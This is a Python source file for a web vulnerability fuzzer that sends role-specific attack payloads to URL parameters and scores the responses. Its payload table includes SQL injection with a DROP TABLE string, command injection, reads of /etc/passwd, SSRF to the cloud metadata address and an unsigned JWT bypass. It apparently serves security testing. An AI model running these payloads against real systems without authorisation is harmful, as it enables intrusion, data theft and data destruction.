import hashlib
import re
import time
from dataclasses import dataclass
from typing import Dict, List, Optional
from urllib.parse import urlparse

import requests

from tools.http_client import build_url
from tools.log_utils import get_logger
from tools.param_classifier import ParamClassifier, ParameterProfile
from tools.response_analyzer import ResponseAnalyzer
from tools.semantic_diff import SemanticDiffEngine
from tools.settings import settings

logger = get_logger("smart_fuzzer")


@dataclass
class FuzzResult:
    param: str
    role: str
    attack_type: str
    payload: str
    vulnerable: bool = False
    evidence: str = ""
    confidence: str = "low"
    before_status: int = 0
    after_status: int = 0
    before_length: int = 0
    after_length: int = 0


ROLE_FUZZ_STRATEGIES = {
    "identifier": {
        "label": "IDOR / BOLA",
        "payloads": [
            ("numeric_id", ["1", "2", "999999", "-1", "0", "1.0"]),
            ("uuid_id", ["00000000-0000-0000-0000-000000000000",
                         "ffffffff-ffff-ffff-ffff-ffffffffffff"]),
            ("string_id", ["admin", "null", "undefined", "none",
                           "../admin", "."]),
        ],
    },
    "filter": {
        "label": "Injection",
        "payloads": [
            ("sqli", ["' OR '1'='1", "' UNION SELECT 1--", "1; DROP TABLE--"]),
            ("nosqli", ['{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}']),
            ("ssti", ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]),
            ("cmdi", ["; id", "| id", "`id`", "$(id)"]),
        ],
    },
    "action": {
        "label": "Action / CMDi",
        "payloads": [
            ("cmdi", ["; id", "| id", "`id`"]),
            ("path_traversal", ["../etc/passwd", "..\\windows\\win.ini"]),
            ("ssrf", ["http://127.0.0.1:8080", "file:///etc/passwd"]),
        ],
    },
    "auth": {
        "label": "Token / Auth Bypass",
        "payloads": [
            ("none_token", ["null", "undefined", "none", "0", "false"]),
            ("alg_none", ["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0."]),
            ("weak_token", ["admin", "test", "token123"]),
        ],
    },
    "config": {
        "label": "SSRF / LFI",
        "payloads": [
            ("ssrf", ["http://127.0.0.1:8080", "http://169.254.169.254/"]),
            ("lfi", ["/etc/passwd", "c:/windows/win.ini"]),
            ("callback", ["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"]),
        ],
    },
    "financial": {
        "label": "Price Manipulation",
        "payloads": [
            ("negative", ["-1", "-99999", "0", "0.01"]),
            ("overflow", ["999999999999", "2147483648", "1e30"]),
            ("fraction", ["0.001", "0.0001", "1e-10"]),
        ],
    },
    "boolean": {
        "label": "Authorization Bypass",
        "payloads": [
            ("flip", ["true", "false", "1", "0", "yes", "no"]),
            ("admin", ["admin", "true", "1", "enabled"]),
        ],
    },
    "content": {
        "label": "XSS / SSTI",
        "payloads": [
            ("xss", ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]),
            ("ssti", ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]),
            ("cmdi", ["; id", "`id`"]),
        ],
    },
}


class SmartFuzzer:
    def __init__(self, sess: Optional[requests.Session] = None):
        self.sess = sess or requests.Session()
        self.sess.verify = settings.verify_ssl
        self.param_classifier = ParamClassifier()
        self.response_analyzer = ResponseAnalyzer()
        self.diff_engine = SemanticDiffEngine()

    def fuzz_point(self, url: str, param: str,
                   sample_value: str = "1",
                   method: str = "GET",
                   post_data: Optional[dict] = None,
                   timeout: float = 10.0) -> List[FuzzResult]:
        results = []
        profile = self.param_classifier.classify(
            param, sample_value, urlparse(url).path, method
        )

        if profile.role == "unknown":
            profile.role = self._infer_role_from_context(param, url)

        strategies = ROLE_FUZZ_STRATEGIES.get(profile.role)
        if not strategies:
            strategies = ROLE_FUZZ_STRATEGIES["content"]

        baseline = self._baseline_request(url, param, sample_value,
                                           method, post_data, timeout)

        for attack_type, payloads in strategies["payloads"]:
            for payload in payloads[:3]:
                result = self._test_payload(
                    url, param, payload, attack_type,
                    profile, baseline, method, post_data, timeout
                )
                if result is not None:
                    results.append(result)

        return results

    def _baseline_request(self, url: str, param: str,
                          sample_value: str, method: str,
                          post_data: Optional[dict],
                          timeout: float) -> Dict:
        try:
            if method.upper() == "POST" and post_data:
                d = post_data.copy()
                d[param] = sample_value
                r = self.sess.post(url, data=d, timeout=timeout)
            else:
                r = self.sess.get(build_url(url, param, sample_value),
                                  timeout=timeout)
            return {
                "status": r.status_code,
                "length": len(r.text),
                "text": r.text,
                "headers": dict(r.headers),
            }
        except Exception as e:
            logger.debug("baseline %s?%s: %s", url, param, e)
            return {"status": 0, "length": 0, "text": "", "headers": {}}

    def _test_payload(self, url: str, param: str, payload: str,
                      attack_type: str, profile: ParameterProfile,
                      baseline: Dict, method: str,
                      post_data: Optional[dict],
                      timeout: float) -> Optional[FuzzResult]:
        result = FuzzResult(
            param=param,
            role=profile.role,
            attack_type=attack_type,
            payload=payload[:80],
        )

        try:
            start = time.time()
            if method.upper() == "POST" and post_data:
                d = post_data.copy()
                d[param] = payload
                r = self.sess.post(url, data=d, timeout=timeout + 3)
            else:
                r = self.sess.get(build_url(url, param, payload),
                                  timeout=timeout + 3)
            elapsed = time.time() - start
        except requests.Timeout:
            if attack_type in ("sqli_time", "cmdi"):
                result.vulnerable = True
                result.evidence = f"timeout (> {timeout}s)"
                result.confidence = "medium"
                return result
            return None
        except Exception as e:
            logger.debug("fuzz %s=%s: %s", param, payload[:15], e)
            return None

        result.before_status = baseline.get("status", 0)
        result.after_status = r.status_code
        result.before_length = baseline.get("length", 0)
        result.after_length = len(r.text)

        if result.before_status != result.after_status:
            if result.after_status == 200 and result.before_status >= 400:
                result.vulnerable = True
                result.evidence = f"status {result.before_status} -> {result.after_status}"
                result.confidence = "high"
                return result

        if attack_type == "sqli":
            return self._check_sqli(result, r.text, baseline)

        if attack_type in ("xss",):
            if self._check_reflection(payload, r.text):
                result.vulnerable = True
                result.evidence = f"reflected: {payload[:30]}"
                result.confidence = "medium"
                return result

        if attack_type in ("ssti", "cmdi", "nosqli"):
            if elapsed >= 2.0:
                result.vulnerable = True
                result.evidence = f"time_delay: {elapsed:.1f}s"
                result.confidence = "medium"
                return result

        analysis = self.response_analyzer.analyze(
            url, r.status_code, dict(r.headers), r.text
        )
        if analysis.is_error:
            result.vulnerable = True
            result.evidence = f"error: {analysis.error_type}"
            result.confidence = "low"
            return result

        return None

    def _check_sqli(self, result: FuzzResult, body: str,
                    baseline: Dict) -> Optional[FuzzResult]:
        errors = [
            r"sql syntax", r"mysql_fetch", r"ora-\d{5}", r"sqlite",
            r"postgresql.*error", r"driver.*error", r"unclosed quotation",
            r"microsoft.*odbc", r"division by zero",
        ]
        for pat in errors:
            if re.search(pat, body, re.I):
                result.vulnerable = True
                result.evidence = f"sql error: {pat}"
                result.confidence = "high"
                return result

        length_diff = abs(len(body) - baseline.get("length", 0))
        if length_diff > 50 and baseline.get("length", 0) > 0:
            result.vulnerable = True
            result.evidence = f"length diff: {length_diff}B"
            result.confidence = "medium"
            return result

        return None

    def _check_reflection(self, payload: str, body: str) -> bool:
        return payload in body and payload.replace("<", "&lt;") not in body

    def _infer_role_from_context(self, param: str, url: str) -> str:
        path = urlparse(url).path.lower()
        if re.search(r"/api/", path) and re.search(r"id$|_id$", param, re.I):
            return "identifier"
        if re.search(r"/search|/query|/filter", path):
            return "filter"
        if re.search(r"/login|/auth|/token", path):
            return "auth"
        if re.search(r"/order|/checkout|/payment|/cart", path):
            return "financial"
        if re.search(r"/admin|/user|/account|/profile", path):
            return "identifier"
        return "content"


# ---------------------------------------------------------------------------
# Response-Learning Fuzzer — sends payloads, scores response differences,
# learns which parameters/attacks produce interesting results
# ---------------------------------------------------------------------------

@dataclass
class ResponseFingerprint:
    status: int
    length: int
    line_count: int
    word_count: int
    hash_prefix: str
    has_error: bool = False
    error_type: str = ""

    @staticmethod
    def from_response(resp: requests.Response) -> "ResponseFingerprint":
        text = resp.text
        return ResponseFingerprint(
            status=resp.status_code,
            length=len(text),
            line_count=text.count("\n"),
            word_count=len(text.split()),
            hash_prefix=hashlib.md5(text.encode()).hexdigest()[:8],
            has_error=resp.status_code >= 500,
            error_type="server_error" if resp.status_code >= 500 else "",
        )

    def diff_score(self, other: "ResponseFingerprint") -> float:
        score = 0.0
        if self.status != other.status:
            score += 3.0
        length_ratio = abs(self.length - other.length) / max(self.length, 1)
        score += min(length_ratio * 5, 3.0)
        if self.line_count != other.line_count:
            score += 1.0
        if self.hash_prefix != other.hash_prefix:
            score += 2.0
        if other.status in (403, 406, 429, 503):
            score -= 2.0
        return score


class LearningFuzzer:
    def __init__(self, sess: requests.Session, timeout: float = 10.0):
        self.sess = sess
        self.timeout = timeout
        self._baselines: Dict[str, ResponseFingerprint] = {}
        self._interesting: List[Dict] = []
        self._param_scores: Dict[str, float] = {}

    def _get_baseline(self, url: str) -> ResponseFingerprint:
        if url not in self._baselines:
            try:
                r = self.sess.get(url, timeout=self.timeout)
                self._baselines[url] = ResponseFingerprint.from_response(r)
            except Exception as e:
                logger.debug("baseline %s: %s", url, e)
                self._baselines[url] = ResponseFingerprint(0, 0, 0, 0, "", has_error=True)
        return self._baselines[url]

    def fuzz_param(self, url: str, param: str, payloads: List[str],
                   attack_type: str = "generic") -> List[Dict]:
        baseline = self._get_baseline(url)
        results = []
        for payload in payloads:
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get(f"{url}{sep}{param}={payload}", timeout=self.timeout)
                fp = ResponseFingerprint.from_response(r)
                score = baseline.diff_score(fp)
                if score > 2.0:
                    entry = {
                        "param": param,
                        "payload": payload[:60],
                        "attack_type": attack_type,
                        "diff_score": round(score, 2),
                        "status": r.status_code,
                        "length": len(r.text),
                        "baseline_status": baseline.status,
                        "baseline_length": baseline.length,
                    }
                    results.append(entry)
                    self._interesting.append(entry)
                    self._param_scores[param] = self._param_scores.get(param, 0) + score
            except Exception as e:
                logger.debug("fuzz %s %s=%s: %s", url, param, payload[:20], e)
        results.sort(key=lambda x: -x["diff_score"])
        return results

    def top_params(self, n: int = 5) -> List[str]:
        return sorted(self._param_scores, key=self._param_scores.get, reverse=True)[:n]

    def top_findings(self, threshold: float = 3.0) -> List[Dict]:
        return [f for f in self._interesting if f["diff_score"] >= threshold]

    def learn_and_refine(self, url: str, params: List[str],
                          base_payloads: Dict[str, List[str]]) -> Dict:
        findings = {}
        for param in params:
            for atype, payloads in base_payloads.items():
                hits = self.fuzz_param(url, param, payloads, atype)
                if hits:
                    findings[f"{param}/{atype}"] = hits
        return {
            "findings": findings,
            "top_params": self.top_params(),
            "high_confidence": self.top_findings(threshold=4.0),
            "param_scores": dict(self._param_scores),
        }
